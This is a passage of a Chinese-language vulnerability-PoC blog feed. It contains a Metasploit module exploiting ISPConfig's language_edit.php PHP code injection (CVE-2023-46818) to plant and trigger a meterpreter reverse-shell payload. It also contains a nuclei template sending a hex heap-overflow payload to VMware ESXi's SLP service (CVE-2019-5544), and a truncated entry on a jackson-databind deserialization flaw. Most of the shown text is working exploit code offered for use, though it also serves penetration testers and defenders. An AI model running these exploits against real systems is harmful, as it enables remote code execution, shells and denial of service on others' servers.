class="hljs-string">&#x27;References&#x27;</span> =&gt; [<br>          [<span class="hljs-string">&#x27;CVE&#x27;</span>, <span class="hljs-string">&#x27;2023-46818&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://github.com/SyFi/CVE-2023-46818&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://karmainsecurity.com/KIS-2023-13&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://karmainsecurity.com/pocs/CVE-2023-46818.php&#x27;</span>]<br>        ],<br>        <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">&#x27;php&#x27;</span>,<br>        <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; ARCH_PHP,<br>        <span class="hljs-string">&#x27;Targets&#x27;</span> =&gt; [<br>          [<br>            <span class="hljs-string">&#x27;Automatic PHP&#x27;</span>,<br>            &#123;<br>              <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">&#x27;php&#x27;</span>,<br>              <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; ARCH_PHP<br>            &#125;<br>          ]<br>        ],<br>        <span class="hljs-string">&#x27;Privileged&#x27;</span> =&gt; <span class="hljs-literal">false</span>,<br>        <span class="hljs-string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="hljs-string">&#x27;2023-10-24&#x27;</span>,<br>        <span class="hljs-string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&#x27;DefaultOptions&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;PAYLOAD&#x27;</span> =&gt; <span class="hljs-string">&#x27;php/meterpreter/reverse_tcp&#x27;</span><br>        &#125;,<br>        <span class="hljs-string">&#x27;Notes&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;Stability&#x27;</span> =&gt; [CRASH_SAFE],<br>          <span class="hljs-string">&#x27;Reliability&#x27;</span> =&gt; [REPEATABLE_SESSION],<br>          <span class="hljs-string">&#x27;SideEffects&#x27;</span> =&gt; [IOC_IN_LOGS]<br>        &#125;<br>      )<br>    )<br><br>    register_options([<br>      OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;TARGETURI&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;The URI path to ISPConfig&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>]),<br>      OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;USERNAME&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;ISPConfig administrator username&#x27;</span>]),<br>      OptString.<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;PASSWORD&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;ISPConfig administrator password&#x27;</span>])<br>    ])<br>  end<br><br>  def check<br>    print_status(<span class="hljs-string">&#x27;Checking if the target is ISPConfig...&#x27;</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login&#x27;</span>)<br>    &#125;)<br>    <span class="hljs-keyword">return</span> CheckCode::Unknown <span class="hljs-keyword">unless</span> res<br>    <span class="hljs-keyword">if</span> res.body.include?(<span class="hljs-string">&#x27;ISPConfig&#x27;</span>) &amp;&amp; (res.body.include?(<span class="hljs-string">&#x27;login&#x27;</span>) || res.body.include?(<span class="hljs-string">&#x27;username&#x27;</span>) || res.body.include?(<span class="hljs-string">&#x27;password&#x27;</span>))<br>      print_good(<span class="hljs-string">&#x27;ISPConfig installation detected&#x27;</span>)<br>      <span class="hljs-keyword">return</span> CheckCode::Detected<br>    end<br>    CheckCode::Safe<br>  end<br><br>  def authenticate<br>    print_status(<span class="hljs-string">&quot;Attempting login with username &#x27;<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>]&#125;</span>&#x27; and password &#x27;<span class="hljs-subst">#&#123;datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>]&#125;</span>&#x27;&quot;</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&#x27;login&#x27;</span>),<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;username&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>],<br>        <span class="hljs-string">&#x27;password&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>],<br>        <span class="hljs-string">&#x27;s_mod&#x27;</span> =&gt; <span class="hljs-string">&#x27;login&#x27;</span><br>      &#125;,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    fail_with(Failure::NoAccess, <span class="hljs-string">&#x27;Login request failed&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    <span class="hljs-keyword">if</span> res.body.match(<span class="hljs-regexp">/Username or Password wrong/i</span>)<br>      fail_with(Failure::NoAccess, <span class="hljs-string">&#x27;Login failed: Invalid credentials&#x27;</span>)<br>    end<br>    <span class="hljs-keyword">if</span> res.headers[<span class="hljs-string">&#x27;Location&#x27;</span>] &amp;&amp; res.headers[<span class="hljs-string">&#x27;Location&#x27;</span>].include?(<span class="hljs-string">&#x27;admin&#x27;</span>) ||<br>       res.body.downcase.include?(<span class="hljs-string">&#x27;dashboard&#x27;</span>)<br>      print_good(<span class="hljs-string">&#x27;Login successful!&#x27;</span>)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    end<br>    print_warning(<span class="hljs-string">&#x27;Login status unclear, attempting to continue...&#x27;</span>)<br>    <span class="hljs-literal">true</span><br>  end<br><br>  def inject_payload<br>    print_status(<span class="hljs-string">&#x27;Injecting PHP payload...&#x27;</span>)<br>    @payload_file = <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;Rex::Text.rand_text_alpha_lower(<span class="hljs-number">8</span>)&#125;</span>.php&quot;</span><br>    php_payload = payload.encoded<br>    injection = <span class="hljs-string">&quot;&#x27;];file_put_contents(&#x27;<span class="hljs-subst">#&#123;@payload_file&#125;</span>&#x27;,&#x27;&lt;?php <span class="hljs-subst">#&#123;php_payload&#125;</span> ?&gt;&#x27;);die;#&quot;</span><br>    lang_file = Rex::Text.rand_text_alpha_lower(<span class="hljs-number">10</span>) + <span class="hljs-string">&quot;.lng&quot;</span><br>    edit_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;language_edit.php&#x27;</span>)<br>    initial_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file<br>    &#125;<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; initial_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;Unable to access language_edit.php&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    csrf_id_match = res.body.match(<span class="hljs-regexp">/_csrf_id&quot; value=&quot;([^&quot;]+)&quot;/</span>)<br>    csrf_key_match = res.body.match(<span class="hljs-regexp">/_csrf_key&quot; value=&quot;([^&quot;]+)&quot;/</span>)<br>    <span class="hljs-keyword">unless</span> csrf_id_match &amp;&amp; csrf_key_match<br>      fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;CSRF tokens not found!&#x27;</span>)<br>    end<br>    csrf_id = csrf_id_match[<span class="hljs-number">1</span>]<br>    csrf_key = csrf_key_match[<span class="hljs-number">1</span>]<br>    print_good(<span class="hljs-string">&quot;Extracted CSRF tokens: ID=<span class="hljs-subst">#&#123;csrf_id[<span class="hljs-number">0.</span>.<span class="hljs-number">10</span>]&#125;</span>..., KEY=<span class="hljs-subst">#&#123;csrf_key[<span class="hljs-number">0.</span>.<span class="hljs-number">10</span>]&#125;</span>...&quot;</span>)<br>    injection_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file,<br>      <span class="hljs-string">&#x27;_csrf_id&#x27;</span> =&gt; csrf_id,<br>      <span class="hljs-string">&#x27;_csrf_key&#x27;</span> =&gt; csrf_key,<br>      <span class="hljs-string">&#x27;records[\\]&#x27;</span> =&gt; injection<br>    &#125;<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; injection_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;Injection request failed&#x27;</span>) <span class="hljs-keyword">unless</span> res<br>    payload_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, @payload_file)<br>    print_good(<span class="hljs-string">&quot;Payload successfully injected: <span class="hljs-subst">#&#123;@payload_file&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> payload_url<br>  end<br><br>  def trigger_payload(payload_url)<br>    print_status(<span class="hljs-string">&#x27;Triggering PHP payload...&#x27;</span>)<br>    <span class="hljs-comment"># Small delay to ensure the file is written</span><br>    sleep(<span class="hljs-number">1</span>)<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; payload_url,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    <span class="hljs-keyword">if</span> res &amp;&amp; res.code == <span class="hljs-number">200</span><br>      print_good(<span class="hljs-string">&#x27;PHP payload triggered successfully&#x27;</span>)<br>    <span class="hljs-keyword">else</span><br>      print_warning(<span class="hljs-string">&#x27;Payload trigger response was unexpected&#x27;</span>)<br>    end<br>  end<br><br>  def cleanup<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">unless</span> @payload_file<br>    print_status(<span class="hljs-string">&#x27;Cleaning up payload file...&#x27;</span>)<br>    <span class="hljs-comment"># Use the same vulnerability to delete the file</span><br>    injection = <span class="hljs-string">&quot;&#x27;];unlink(&#x27;<span class="hljs-subst">#&#123;@payload_file&#125;</span>&#x27;);die;#&quot;</span><br>    lang_file = Rex::Text.rand_text_alpha_lower(<span class="hljs-number">10</span>) + <span class="hljs-string">&quot;.lng&quot;</span><br>    edit_url = normalize_uri(target_uri.path, <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;language_edit.php&#x27;</span>)<br>    initial_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file<br>    &#125;<br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; initial_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">unless</span> res<br>    csrf_id_match = res.body.match(<span class="hljs-regexp">/_csrf_id&quot; value=&quot;([^&quot;]+)&quot;/</span>)<br>    csrf_key_match = res.body.match(<span class="hljs-regexp">/_csrf_key&quot; value=&quot;([^&quot;]+)&quot;/</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">unless</span> csrf_id_match &amp;&amp; csrf_key_match<br>    csrf_id = csrf_id_match[<span class="hljs-number">1</span>]<br>    csrf_key = csrf_key_match[<span class="hljs-number">1</span>]<br>    injection_data = &#123;<br>      <span class="hljs-string">&#x27;lang&#x27;</span> =&gt; <span class="hljs-string">&#x27;en&#x27;</span>,<br>      <span class="hljs-string">&#x27;module&#x27;</span> =&gt; <span class="hljs-string">&#x27;help&#x27;</span>,<br>      <span class="hljs-string">&#x27;lang_file&#x27;</span> =&gt; lang_file,<br>      <span class="hljs-string">&#x27;_csrf_id&#x27;</span> =&gt; csrf_id,<br>      <span class="hljs-string">&#x27;_csrf_key&#x27;</span> =&gt; csrf_key,<br>      <span class="hljs-string">&#x27;records[\\]&#x27;</span> =&gt; injection<br>    &#125;<br>    send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; edit_url,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; injection_data,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span><br>    &#125;)<br>    print_good(<span class="hljs-string">&quot;Payload file <span class="hljs-subst">#&#123;@payload_file&#125;</span> cleaned up&quot;</span>)<br>  end<br><br>  def exploit<br>    authenticate<br>    payload_url = inject_payload<br>    print_status(<span class="hljs-string">&#x27;Starting payload handler...&#x27;</span>)<br>    trigger_payload(payload_url)<br>    print_status(<span class="hljs-string">&#x27;Manual trigger information:&#x27;</span>)<br>    print_line(<span class="hljs-string">&quot;URL: <span class="hljs-subst">#&#123;full_uri&#125;</span><span class="hljs-subst">#&#123;payload_url&#125;</span>&quot;</span>)<br>    print_line(<span class="hljs-string">&quot;Manual trigger: curl &#x27;<span class="hljs-subst">#&#123;full_uri&#125;</span><span class="hljs-subst">#&#123;payload_url&#125;</span>&#x27;&quot;</span>)<br>  end<br>end<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; ISPConfig language_edit.php PHP代码注入漏洞&lt;/</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
    
    <category term="代码注入" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>VMware ESXi OpenSLP Heap Overflow Vulnerability</title>
    <link href="http://example.com/2025/06/27/github_311558441/"/>
    <id>http://example.com/2025/06/27/github_311558441/</id>
    <published>2025-06-27T06:15:12.747Z</published>
    <updated>2025-06-27T06:15:12.747Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> VMware ESXi OpenSLP Heap Overflow Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2019-5544</li></ul><p><strong>漏洞类型：</strong> 缓冲区溢出</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> VMware ESXi和Horizon DaaS设备中的OpenSLP组件存在堆溢出漏洞，允许拒绝服务攻击和远程攻击者执行任意代码。</p><p><strong>产品厂商：</strong> VMware</p><p><strong>产品名称：</strong> VMware ESXi</p><p><strong>搜索语法：</strong> http.title:”horizon daas”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/cbf175a860a5212bf3006dda072eee9081f73f68/network%2Fcves%2F2019%2FCVE-2019-5544.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/cbf175a860a5212bf3006dda072eee9081f73f68/network%2Fcves%2F2019%2FCVE-2019-5544.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">201</span>9-<span class="hljs-number">5544</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> VMware ESXi SLP <span class="hljs-operator">-</span> Heap Overflow DoS (CVE-<span class="hljs-number">201</span>9-<span class="hljs-number">5544</span>)<br>  <span class="hljs-params">author:</span> riteshs4hu<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    OpenSLP <span class="hljs-keyword">in</span> ESXi and Horizon DaaS appliances contains a heap overwrite caused by a vulnerability <span class="hljs-keyword">in</span> the OpenSLP component, letting DoS and remote attackers execute arbitrary code.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2019-5544</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/dgh05t/VMware_ESXI_OpenSLP_PoCs</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">1</span><br>    <span class="hljs-params">shodan-query:</span><br>      <span class="hljs-operator">-</span> http.title:<span class="hljs-string">&quot;horizon daas&quot;</span><br>    <span class="hljs-params">tags:</span> cve,cve2019,vmware,esxi,overflow,dos<br><br><span class="hljs-params">network:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">inputs:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">data:</span> <span class="hljs-string">&quot;020300105e0000000000660d0002656e0010000014687474703a2f2f7777772e62616964752e636f6d0100001000010101010ff6797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979797979001c736572766963653a564d77617265496e667261737472756374757265000764656661756c74000a7070707070707070707000&quot;</span><br>        <span class="hljs-params">type:</span> hex<br>    <span class="hljs-params">host:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;Hostname&#125;&#125;&quot;</span><br>    <span class="hljs-params">port:</span> <span class="hljs-number">427</span><br><br>  <span class="hljs-operator">-</span> <span class="hljs-params">inputs:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">data:</span> <span class="hljs-string">&quot;0201000047000000000000000002656e000a31323334353637383930001c736572766963653a564d77617265496e667261737472756374757265000764656661756c7400000000&quot;</span><br>        <span class="hljs-params">type:</span> hex<br>    <span class="hljs-params">host:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;Hostname&#125;&#125;&quot;</span><br>    <span class="hljs-params">port:</span> <span class="hljs-number">427</span><br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;len(data) == 0&quot;</span><br>        <span class="hljs-params">condition:</span> and<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; VMware ESXi OpenSLP Heap Overflow Vulne</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
    <category term="缓冲区溢出" scheme="http://example.com/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>FasterXML jackson-databind 反序列化漏洞</title>
    <link href="http://example.com/2025/06/27/github_4126284426/"/>
    <id>http://example.com/2025/06/27/github_4126284426/</id>
    <published>2025-06-27T02:30:17.251Z</published>
    <updated>2025-06-27T02:30:17.250Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> FasterXML jackson-databind 反序列化漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2020-9548</li></ul><p><strong>漏洞类型：</strong> 反序列化</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> FasterXML jackson-databind 2.x 在2.9.10.4之前的版本中，处理序列化小工具和类型交互时存在缺陷，与br.com.anteros.dbcp.AnterosDBCPConfig（即anteros-core）相关。</p><p><strong>产品厂商：</strong> FasterXML</p><p><strong>产品名称：</strong> jackson-databind</p><p><strong>影响版本：</strong> 2.x &lt; 2.9.10.4</p><p><strong>搜索语法：</strong> cpe:”cpe:2.3:o:debian:debian_linux”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12484">https://github.com/projectdiscovery/nuclei-templates/issues/12484</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h4><blockquote><p>FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction between serialization gadgets and typing, related to br.com.anteros.dbcp.AnterosDBCPConfig (aka anteros-core).</p></blockquote><h5 id="Severity-Critical"><a href="#Severity-Critical" class="headerlink" title="Severity: Critical"></a>Severity: <code>Critical</code></h5><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul><li><a href="https://github.com/fairyming/CVE-2020-9548">https://github.com/fairyming/CVE-2020-9548</a></li></ul><h4 id="KEV-True"><a href="#KEV-True" class="headerlink" title="KEV: True"></a>KEV: 